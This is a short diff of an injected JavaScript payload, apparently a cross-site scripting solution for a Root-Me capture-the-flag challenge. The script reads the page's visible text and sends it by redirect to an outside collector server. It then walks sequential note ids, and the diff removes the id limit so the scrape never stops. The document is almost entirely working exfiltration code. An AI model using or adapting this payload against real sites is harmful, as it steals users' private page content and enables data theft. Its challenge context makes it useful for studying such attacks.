@@ -1,21 +1,20 @@
 <script>
 (function () {
-    const BASE = "https://your-app.up.railway.app";
+    const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056";
+    const SERVER = "https://your-app.up.railway.app";
 
     const parts = location.pathname.split("/");
-    let id = parseInt(parts[parts.length - 1]);
+    const id = parseInt(parts[parts.length - 1]);
 
     if (isNaN(id)) {
-        location.href = "/notes/0";
+        location.href = TARGET + "/notes/0";
         return;
     }
-
-    if (id > 2000) return;
 
     const data = encodeURIComponent(document.body.innerText);
 
     location.href =
-        BASE +
+        SERVER +
         "?id=" + id +
         "&d=" + data +
         "&next=" + (id + 1);
